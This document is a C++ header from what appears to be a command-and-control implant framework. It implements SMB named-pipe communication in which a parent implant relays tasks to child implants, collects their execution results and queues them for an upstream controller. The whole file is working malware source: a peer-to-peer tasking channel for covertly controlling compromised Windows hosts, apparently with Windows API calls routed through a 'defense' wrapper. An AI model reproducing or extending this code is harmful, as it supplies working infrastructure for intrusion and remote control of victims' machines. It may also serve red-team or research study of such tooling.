/**
 * @file smb_comms.h
 * @brief Handles SMB/Named Pipe communication between parent and child implants.
 */

#pragma once

#include <windows.h>
#include <vector>
#include <mutex>
#include "comms/queues.h"
#include "_debug/debug.h"
#include "defense/winapi.h"
//Awaits for a parent to connect to the pipe. IF we don't have this, we get an immediate
//536 pipe error: Waiting for a process to open the other end of the pipe.

/**
 * @namespace SMB
 * @brief Encapsulates all Server Message Block (SMB) and Named Pipe routing logic.
 */
//for routing to smb
namespace SMB {

    /**
     * @brief Dynamically reads data from a specified named pipe into a buffer.
     * * Reads in chunks of 8192 bytes, handling cases where the incoming data is 
     * larger than the chunk size (ERROR_MORE_DATA) by looping until the transfer completes.
     * * @param h_pipe A handle to the pipe to read from.
     * @param out_buffer A reference to a byte vector where the read data will be stored. 
     * This buffer is cleared before reading begins.
     * @return DWORD Returns ERROR_SUCCESS (0) on success, or a Windows API error code on failure.
     */
    //generic pipe reader to dynamically read the pipe
    DWORD read_pipe_dynamic(HANDLE h_pipe, std::vector<uint8_t>& out_buffer) {
        const DWORD CHUNK_SIZE = 8192;
        std::vector<uint8_t> chunk(CHUNK_SIZE);
        DWORD bytes_read = 0;

        out_buffer.clear();

        while (true) {
            DEBUG_LOG("[SMB::read_pipe_dynamic]: Reading " << CHUNK_SIZE << " bytes from pipe");
            BOOL success = WinApi::ReadFile(h_pipe, chunk.data(), CHUNK_SIZE, &bytes_read, NULL);
            DWORD err = WinApi::GetLastError();

            // Append whatever was just read to the master buffer
            if (bytes_read > 0) {
                out_buffer.insert(out_buffer.end(), chunk.begin(), chunk.begin() + bytes_read);
            }

            if (success) {
                // ReadFile returned TRUE. The entire message has been read.
                DEBUG_LOG("[SMB::read_pipe_dynamic]: Transfer Complete");
                break;
            }

            if (!success && err == ERROR_MORE_DATA) {
                // The buffer was too small. The data is appended, loop and read the rest.
                continue;
            }

            // If any other error occurs (like ERROR_BROKEN_PIPE), bail out
            DEBUG_LOG("[SMB::read_pipe_dynamic] Error occured: "<< err);
            return err;
        }

        return ERROR_SUCCESS;
    }


    /*
    If we are the child.... these are the funcs we want
    
    */
    /**
     * @namespace SMB::Child
     * @brief Contains pipe operations intended for use by the child implant.
     */
    namespace Child {

        /**
         * @brief Synchronously waits for a client (parent) to connect to the named pipe.
         * * @param h_pipe The handle to the named pipe instance.
         * @param pipe_name The string identifier for the pipe, used primarily for debug logging.
         * @return true If the parent successfully connects or is already connected.
         * @return false If the connection attempt fails.
         */
        bool await_client_connection(HANDLE h_pipe, const std::string& pipe_name) {
            DEBUG_LOG("[SMB::Child::await_client_connection]: Waiting for parent to connect to " << pipe_name << " pipe...");

            // Synchronous block. It halts the thread here until the parent connects.
            BOOL connected = WinApi::ConnectNamedPipe(h_pipe, NULL);

            if (!connected && WinApi::GetLastError() != ERROR_PIPE_CONNECTED) {
                //std::cerr << "ConnectNamedPipe failed: " << GetLastError() << std::endl;
                DEBUG_LOG("[SMB::Child::await_client_connection]: Connecting to pipe failed: " << WinApi::GetLastError());
                return false;
            }

            DEBUG_LOG("[SMB::Child::await_client_connection]: Parent connected to " << pipe_name << "!");
            return true;
        }
    
        /**
         * @brief Sends a check-in request to the parent and retrieves pending tasks.
         * * @param h_inbox The pipe handle to read responses from the parent.
         * @param h_outbox The pipe handle to send the check-in request up to the parent.
         * @param get_request_payload The serialized payload representing the GET request.
         * @return std::vector<uint8_t> A buffer containing the tasks sent by the parent, or an empty buffer if it fails.
         */
        std::vector<uint8_t> fetch_tasks(HANDLE h_inbox, HANDLE h_outbox, const std::vector<uint8_t>& get_request_payload) {
            DWORD bytes_written = 0;
            DEBUG_LOG("[SMB::Child::fetch_tasks]: Fetching Tasks");
            // Write the GET request up to the Parent
            if (!WinApi::WriteFile(h_outbox, get_request_payload.data(), static_cast<DWORD>(get_request_payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Child::fetch_tasks]: Write Error: " << WinApi::GetLastError());
                return {};
            }

            // Read the response from the Parent using the dynamic helper
            std::vector<uint8_t> inbound_buffer;
            DWORD read_status = read_pipe_dynamic(h_inbox, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                DEBUG_LOG("[SMB::Child::fetch_tasks]: Retrieved data from parent");
                return inbound_buffer;
            }

            DEBUG_LOG("[SMB::Child::fetch_tasks]: No data from parent, inbound buffer was empty, or a failed read");
            return {};
        }

        /**
         * @brief Synchronously sends data up to the parent via the outbox pipe.
         * * @param h_outbox The pipe handle to write the data to.
         * @param payload The raw byte vector representing the data/response to send.
         * @return true If the data was successfully written to the pipe.
         * @return false If the payload is empty, handle is invalid, or the write fails.
         */
        bool send_data(HANDLE h_outbox, const std::vector<uint8_t>& payload) {
            if (payload.empty() || h_outbox == INVALID_HANDLE_VALUE) {
                DEBUG_LOG("[SMB::Child::send_data]: Payload empty or outbox handle is invalid: " << WinApi::GetLastError());
                return false;
            }

            DWORD bytes_written = 0;
            if (!WinApi::WriteFile(h_outbox, payload.data(), static_cast<DWORD>(payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Child::send_data]: Immediate pipe write error: " << WinApi::GetLastError());
                return false;
            }

            DEBUG_LOG("[SMB::Child::send_data]: Instantly sent " << bytes_written << " bytes to parent.");
            return true;
        }


    }

    /*
    If we are the parent... these are the funcs we want
    
    */
    /**
     * @namespace SMB::Parent
     * @brief Contains pipe operations intended for use by the parent (controller/router) implant.
     */
    namespace Parent { //rename cycle child
                
        /**
         * @brief Executes a full interaction cycle with a downstream child implant.
         * * @param h_write The pipe handle used to send tasks down to the child.
         * @param h_read The pipe handle used to read the child's check-in and execution responses.
         * @param raw_task The JSON task payload to send to the child for execution.
         * @param expect_response A flag indicating whether to block and wait for a response after tasking.
         * @return nlohmann::json The JSON response from the child if expect_response is true; otherwise, an empty JSON object.
         */
        nlohmann::json cycle_child(HANDLE h_write, HANDLE h_read, const nlohmann::json& raw_task, bool expect_response) {
            /*
            Cycle the SMB child.

            This:
             1. Gets the current GET task sitting in the SMB outbox pipe.
                > pushes to GET queue
             2. Pushes the passed in task *to* the inbox of the child.
             3. gets the response from the child in the outbox pipe.
                > Pushes result to POST queue
            */
            DEBUG_LOG("[SMB::Parent::cycle_child]: Interacting with child implant");

            std::vector<uint8_t> inbound_buffer;

            // 1. Wait for and read the child check-in (GET request)
            DWORD read_status = read_pipe_dynamic(h_read, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                try {
                    nlohmann::json get_from_child = nlohmann::json::from_msgpack(inbound_buffer);
                    GetQueue::push(get_from_child);
                }
                catch (const std::exception& e) {
                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on child check-in: " << e.what());
                    return nlohmann::json{};
                }
            }
            else {
                // read_pipe_dynamic returns the exact error code now, no need for GetLastError()
                DEBUG_LOG("ReadFile failed on child check-in. Error: " << read_status);

                return nlohmann::json{};
            }

            // 2. Package and forward the task to the child
            nlohmann::json task_list = nlohmann::json::array();
            task_list.push_back(raw_task);

            std::vector<uint8_t> msgpack_payload;
            try {
                msgpack_payload = nlohmann::json::to_msgpack(task_list);
            }
            catch (const std::exception& e) {
                DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task serialization: " << e.what());
                return nlohmann::json{};
            }

            DWORD bytes_written = 0;
            if (!WinApi::WriteFile(h_write, msgpack_payload.data(), static_cast<DWORD>(msgpack_payload.size()), &bytes_written, NULL)) {
                DEBUG_LOG("[SMB::Parent::cycle_child]: WriteFile failed sending task to child. Error: " << WinApi::GetLastError());
                return nlohmann::json{};
            }

            if (!expect_response) {
                return nlohmann::json{};
            }

            // 3. Wait for and read the task execution response
            inbound_buffer.clear(); // Important: clear the buffer before reusing it!
            read_status = read_pipe_dynamic(h_read, inbound_buffer);

            if (read_status == ERROR_SUCCESS && !inbound_buffer.empty()) {
                try {
                    return nlohmann::json::from_msgpack(inbound_buffer);
                }
                catch (const std::exception& e) {
                    DEBUG_LOG("[SMB::Parent::cycle_child]: MsgPack unpack failed on task response" << e.what());
                    return nlohmann::json{};
                }
            }
            else {
                DEBUG_LOG("[SMB::Parent::cycle_child]: ReadFile failed on task response. Error: " << read_status);
                return nlohmann::json{};
            }
        }
    }
}